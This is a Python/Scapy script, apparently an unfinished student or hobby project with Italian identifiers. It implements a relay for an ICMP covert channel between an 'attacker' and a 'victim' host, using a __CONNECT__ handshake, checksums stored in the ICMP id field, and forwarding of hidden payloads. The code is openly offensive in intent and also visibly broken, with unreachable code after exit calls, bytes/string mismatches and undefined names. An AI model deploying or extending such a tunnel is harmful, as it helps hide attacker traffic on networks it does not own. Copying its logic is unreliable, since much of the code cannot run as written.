from scapy.all import IP, ICMP,Raw, sr1, AsyncSniffer
from scapy.all import *
import threading 
import argparse 
import mymethods
import time
import re
import comunication_methods as com

event = threading.Event() 
pkt_conn_received = threading.Event() 

def callback_redirect(packet):
    if packet[IP].src is not ip_attaccante:
        print(f"Il pacchetto non è stato mandato dall'attaccante ma da {packet[IP].src}")
        return
    print(f"Reindirizzamento del pacchetto {packet}") 
    payload=""
    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
        payload = bytes(packet[Raw].load)
    print(payload) 
    if "__END__" in payload:
        payload=payload.replace("__END__","").strip()
        if payload=="":
            print("Fine connessione")
            com.pkt_conn_received.set()
            return 
    if not packet[ICMP].id==mymethods.calc_checksum(payload):
        print("Il payload non combacia con il checksum")
        print(packet.summary())
        return
    pkt = IP(dst=ip_attaccante)/ICMP(id=packet[ICMP].id, seq=packet[ICMP].seq) / payload
    ans = sr1(pkt, timeout=2, verbose=1)
    if ans:
        print(f"{ip_attaccante} is alive")
        #ans.show() 
    else:
        print(f"No reply: {ip_attaccante} is not responding") 

def parte_redirect_packet():
    sniffer= AsyncSniffer(
        filter=f"icmp and src host {ip_attaccante}" 
        #,count=1 
        ,prn=callback_redirect 
        # #,store=True 
        # #,iface=args.host_iface 
    ) 
    sniffer.start()
    com.pkt_conn_received.wait()
    sniffer.stop()
    sniffer.join() 

def callback_vittima(packet):
    print("callback_vittima")
    global timeout_timer,ip_vittima
    print("Packet received: {}".format(packet.summary())) 
    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
        payload = mymethods.calc_checksum(bytes(packet[Raw].load))
        check_sum=mymethods.calc_checksum(b"__CONNECT__ ")  
        if packet[ICMP].type!=8 and packet[ICMP].type!=0:
            print(f"Il messaggio non è una Request o Reply: {packet[ICMP].type}")
            return
            raise Exception(f"Il messaggio non è una Request o Reply: {packet[ICMP].type}")
        if check_sum==payload and ip_vittima==packet[IP].src and packet[ICMP].id==check_sum:
            print("Payload: {}".format(payload)) 
            print("Vittima IPs: {}".format(ip_vittima))
            com.pkt_received_event.set()
            timeout_timer.cancel() 
            com.pkt_conn_received.set()
        else: 
            print(f"Il paccheto proviene da {packet[IP].src} ma non è valido")
            return
            raise Exception(f"Il paccheto proviene da {packet[IP].src} ma non è valido")    

def connessione_vittima():
    data="__CONNECT__ "
    if com.send_packet(data, ip_vittima):
        args={
            "filter":f"icmp and src {ip_vittima}" 
            #,"count":1 
            ,"prn":callback_vittima 
            #,"store":True 
            ,"iface":mymethods.iface_from_IP(ip_vittima)[1]
        }
        com.sniff_packet(args)
        pkt_conn_received.wait()
        if com.sniffer.running:
            com.sniffer.stop()
            com.sniffer.join()
            return True
    print(f"{ip_vittima} is not responding: No Reply")
    return False 

def callback_attaccante(packet):
    global ip_vittima
    print("Packet received: {}".format(packet.summary())) 
    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
        payload = bytes(packet[Raw].load)
        if b'__CONNECT__' in payload and ip_attaccante==packet[IP].src:
            print("Found __CONNECT__")
            ip_vittima= payload.decode().replace('__CONNECT__',"").strip()
            print("Attacker IP: {}".format(ip_attaccante))
            #print("Payload: {}".format(payload)) 
            print("Vittima IPs: {}".format(ip_vittima))
            com.pkt_conn_received.set()
        else:
            print(f"Il paccheto proviene da {packet[IP].src} ma non richiede la connessione alla macchina")

def wait_conn_from_attaccante():
    print(f"Attendo connessione da {ip_attaccante} attraverso {mymethods.iface_from_IP(ip_attaccante)[1]}")
    args={
        "filter":f"icmp and src {ip_attaccante}" 
        #,"count":1 
        ,"prn":callback_attaccante 
        #,"store":True 
        ,"iface":mymethods.iface_from_IP(ip_attaccante)[1]
    } 
    com.sniff_packet(args)
    com.pkt_conn_received.wait() 
    if com.sniffer.running:
        com.sniffer.stop()
        com.sniffer.join()
    if com.timeout_timer.is_alive():
        com.timeout_timer.cancel()
        data=b"__CONNECT__ " 
        if com.send_packet(data,ip_attaccante):
            print(f"Connessione stabilita per {ip_attaccante}")
            return True
    print(f"Connessione non disponibile per {ip_attaccante}")
    return False

    if not com.check_connessione(ip_attaccante,args): 
        print("Connessione con l'attaccante: NON DISPONIBILE")
        exit(0)

def get_value_of_parser(args):
    if args is None: 
        raise Exception("Nessun argomento passato")
    global ip_attaccante, gateway_attaccante
    ip_attaccante=args.ip_attaccante 
    gateway_attaccante=mymethods.calc_gateway(ip_attaccante)

    global ip_vittima, gateway_vittima
    ip_vittima=args.ip_vittima 
    gateway_vittima=mymethods.calc_gateway(ip_vittima)

def check_value_in_parser(args):
    if type(args) is not argparse.Namespace or args is None:
        print("Nessun argomento passato") 
        return False
    if args.ip_attaccante is None or type(args.ip_attaccante) is not str or re.match(com.ip_reg_pattern, args.ip_attaccante) is None:
        print("IP attaccante non valido o non specificato")
        mymethods.supported_arguments(parser)
        return False   
    if args.ip_vittima is None or type(args.ip_vittima) is not str or re.match(com.ip_reg_pattern, args.ip_vittima) is None:
        print("IP vittima non valido o non specificato")
        mymethods.supported_arguments(parser)
        return False
    return True

def get_args_from_parser():
    global parser
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip_host",type=str, help="IP dell'attaccante")
    parser.add_argument("--ip_attaccante",type=str, help="IP dell'attaccante")
    parser.add_argument("--ip_vittima",type=str, help="IP vittima")
    #parser.add_argument("--provaFlag",type=int, help="Comando da eseguire")
    return mymethods.check_args(parser)

def def_global_variables():
    pass

if __name__ == "__main__": 
    try:
        def_global_variables()
        args=get_args_from_parser() 
        if not check_value_in_parser(args):
            exit(0)
        get_value_of_parser(args) 
    except Exception as e: 
        print(f"Eccezione: {e}")
        exit(1)
    print(f"IP attaccante:\t{ip_attaccante}")
    print(f"Gateway attaccante:\t{gateway_attaccante}") 
    print(f"IP vittima:\t{ip_vittima}")
    print(f"Gateway vittima:\t{gateway_vittima}") 
    try:
        wait_conn_from_attaccante()
    except Exception as e:
        print(f"Eccezione: {e}")
        exit(1)
    exit(0)
    try: 
        if not connessione_vittima():
            exit(0) 
    except Exception as e:
        print(f"Eccezzione: {e}")
        exit(1)
    exit(0)
    try:
        parte_vittima()
    except Exception as e:
        print(f"Eccezzione: {f}")
    try:
        parte_redirect_packet() 
        #thread = threading.Thread(target=sniff_4_start)
        #thread.start() 
    except Exception as e:
        print(f"Eccezzione: {f}")